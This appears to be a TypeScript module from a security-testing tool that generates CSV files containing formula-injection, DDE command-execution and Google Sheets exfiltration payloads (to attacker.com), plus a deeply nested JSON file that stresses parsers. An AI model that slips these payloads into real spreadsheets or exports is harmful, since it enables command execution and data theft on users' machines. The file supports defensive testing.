import { GenerationSettings } from '../types';

export const generateDataFile = async (settings: GenerationSettings): Promise<Blob> => {
  const { dataPayloadType, text } = settings;

  if (dataPayloadType?.startsWith('CSV')) {
    let payload = '';
    
    // Standard Headers
    let content = 'ID,Name,Description,Cost\n';
    
    // Malicious Row
    switch (dataPayloadType) {
      case 'CSV_FORMULA_INJECTION':
        // Basic Excel Injection
        payload = `=cmd|' /C calc'!A0`;
        break;
      case 'CSV_DDE_EXCEL':
        // Dynamic Data Exchange
        payload = `=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!''`;
        break;
      case 'CSV_GOOGLE_SHEETS':
        // Google Sheets Exfiltration
        payload = `=IMPORTXML("http://attacker.com/log?key="&A1, "//a")`;
        break;
      default:
        payload = `=1+1`;
    }

    // Add safe rows then malicious row
    content += `1,Safe Item,This is fine,10\n`;
    content += `2,Safe Item 2,Still fine,20\n`;
    content += `3,${payload},${text || 'Malicious Payload'},0\n`;
    content += `4,Another Item,Padding,5\n`;

    return new Blob([content], { type: 'text/csv' });
  }

  if (dataPayloadType === 'JSON_HUGE_NESTING') {
    // Stack overflow tester for JSON parsers
    const depth = 5000;
    let json = '{"a": 1}';
    for (let i = 0; i < depth; i++) {
        json = `{"nest": ${json}}`;
    }
    return new Blob([json], { type: 'application/json' });
  }

  return new Blob([''], { type: 'text/plain' });
};
